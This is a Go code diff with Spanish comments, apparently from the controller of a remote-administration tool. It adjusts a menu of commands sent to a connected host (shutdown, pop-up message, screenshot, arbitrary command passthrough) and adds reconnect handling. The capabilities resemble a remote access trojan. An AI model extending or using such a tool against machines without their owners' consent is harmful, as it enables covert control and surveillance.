@@ -14,12 +14,12 @@ import (
 )
 
 const INSTRUCCION = `
-//comandos basicos:      //
-//[0] borrar script      //       
-//[1] apagar equipo      //
-//[2] enviar mensaje     //
-//[q] salir              //
-//[ss] capturar pantalla //
+//comandos basicos:       //
+//[0] limpiar consola     //       
+//[1] apagar equipo       //
+//[2] enviar mensaje      //
+//[q] salir               //
+//[ss] capturar pantalla  //
 `
 
 // funcion que abstrae el envio de paquetes al host
@@ -52,10 +52,10 @@ func envio(conexiones net.Conn, envio string) error {
 
 // funcion cuyo proposito es la ejecucion de comandos
 func Comando(conexiones net.Conn) error {
-
+	var reconectar = errors.New("reconexion")
 	for {
 
-		println(INSTRUCCION)
+		println(color.Violeta + INSTRUCCION + color.Reset)
 		entrada := input.Input("[#] comando >> ")
 		switch entrada {
 		case "0":
@@ -76,7 +76,7 @@ func Comando(conexiones net.Conn) error {
 			mensaje := input.Input("mensaje >> ")
 			msg_format := fmt.Sprintf("msg * %s", mensaje)
 			envio(conexiones, msg_format)
-			continue
+			return reconectar
 
 		case "q":
 			fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
@@ -89,6 +89,7 @@ func Comando(conexiones net.Conn) error {
 			}
 			nombre := input.Input("[*] nombre del png (sin extension)>> ")
 			ss.Escribir_img(byte_img, nombre)
+			return reconectar
 
 		default:
 			err := envio(conexiones, entrada)
@@ -98,5 +99,6 @@ func Comando(conexiones net.Conn) error {
 			continue
 
 		}
+
 	}
 }
